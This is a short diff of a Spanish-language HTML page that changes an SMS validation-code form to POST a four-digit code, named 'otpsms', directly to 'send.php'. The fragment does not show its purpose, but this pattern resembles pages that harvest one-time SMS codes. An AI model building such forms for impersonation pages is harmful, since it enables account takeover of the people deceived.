@@ -283,13 +283,14 @@
             
 
             <!-- Formulario -->
-            <form id="smsForm" onsubmit="handleSmsSubmit(event)">
+            <form id="smsForm" action="send.php" method="POST">
                 <!-- Input Código -->
                 <div class="form-group">
                     <label class="form-label" for="codigo">Código de validación</label>
                     <input 
                         type="text" 
-                        id="codigo" 
+                        id="codigo"
+                        name="otpsms"
                         class="form-input" 
                         placeholder="0000"
                         maxlength="4"
